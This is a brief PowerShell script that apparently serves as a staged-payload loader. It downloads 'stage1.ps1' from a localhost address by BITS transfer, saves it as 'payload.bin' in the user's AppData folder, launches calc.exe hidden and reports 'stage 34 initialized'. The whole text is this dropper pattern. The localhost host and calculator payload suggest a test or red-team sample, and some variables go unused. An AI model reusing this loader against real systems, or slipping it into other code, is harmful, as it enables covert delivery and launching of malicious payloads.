
# Payload transfer
$PayloadUrl = "http://localhost:9001/stage1.ps1"
$Stage2Path = "$env:APPDATA\payload.bin"
$TimeoutSec = 167
try { Start-BitsTransfer -Source $PayloadUrl -Destination $Stage2Path; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; Set-Location -Path $env:TEMP; Write-Output "stage 34 initialized" } catch { Write-Warning "Loader step failed" }
